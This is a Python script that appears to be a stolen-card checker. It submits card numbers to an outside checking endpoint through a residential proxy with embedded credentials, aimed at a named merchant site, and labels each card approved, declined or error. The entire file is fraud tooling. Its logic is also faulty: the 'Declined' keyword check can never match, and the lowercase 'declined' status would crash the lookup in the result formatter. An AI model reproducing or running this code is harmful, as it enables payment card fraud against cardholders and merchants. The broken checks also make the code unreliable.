import aiohttp
import asyncio
import time

async def async_auth_func(card: str, proxy: str = None):
    url = "https://kiltes.lol/str/"
    params = {
        "cc": card,
        "proxy": proxy or "proxy.proxiware.com:1337:user-default-network-res-country-us:OedbOv0g3JOQ",
        "site": "https://www.tekkabazzar.com"
    }

    start = time.perf_counter()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, params=params, timeout=15) as response:
                took = time.perf_counter() - start

                if response.status == 200:
                    try:
                        data = await response.json()
                        msg = data.get("result") or data.get("message") or data.get("error") or str(data)
                    except:
                        msg = await response.text()
                else:
                    msg = f"HTTP {response.status}"
                    return format_result(card, msg, "error", took)

    except asyncio.TimeoutError:
        return format_result(card, "Request Timeout", "error", time.perf_counter() - start)
    except Exception as e:
        return format_result(card, str(e), "error", time.perf_counter() - start)

    # Analyze message
    msg_lower = msg.lower()
    if "payment method added" in msg_lower or "charged" in msg_lower:
        return format_result(card, msg, "Approved", took)
    elif any(x in msg_lower for x in ["Declined", "not support", "do not honor", "pickup", "fraud", "stolen", "lost"]):
        return format_result(card, msg, "declined", took)
    else:
        return format_result(card, msg, "error", took)

def format_result(card, msg, status, time_taken):
    status_map = {
        "Approved": "✅",
        "Declined": "❌",
        "error": "❗"
    }
    label = {
        "Approved": "[✓] Approved",
        "Declined": "[✘] Declined",
        "error": "[!] Error"
    }

    return {
        "status": f"{status} {status_map[status]}",  # 👈 status includes emoji now
        "emoji": status_map[status],
        "label": label[status],
        "card": card,
        "response": msg,
        "time": round(time_taken, 2)
    }
